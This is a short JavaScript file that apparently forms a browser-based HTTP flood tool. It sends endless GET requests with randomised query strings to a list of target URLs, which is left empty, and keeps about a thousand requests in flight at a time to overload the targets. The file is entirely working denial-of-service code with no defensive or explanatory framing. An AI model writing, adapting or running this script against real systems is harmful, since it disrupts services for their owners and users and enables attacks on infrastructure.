var targets = []; // url List

var currencyLimit = 1000;

var queue = [];

async function fetchWithTimeout(resource, options) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), options.timeout);
  return fetch(resource, {
    method: 'GET',
    mode: 'no-cors',
    signal: controller.signal,
  })
    .then((resource) => {
      clearTimeout(id);
      return resource;
    })
    .catch((error) => {
      clearTimeout(id);
      throw error;
    });
}

async function flood(target) {
  for (var i = 0; ; ++i) {
    if (queue.length > currencyLimit) {
      await queue.shift();
    }
    var rand = i % 3 === 0 ? '' : '?' + Math.random() * 1000;
    queue.push(
      fetchWithTimeout(target + rand, { timeout: 1000 })
        .catch((error) => {
          if (error.code === 20 /** ABORT */) {
            return;
          }
        })
        .then((response) => {}),
    );
  }
}

targets.map(flood);
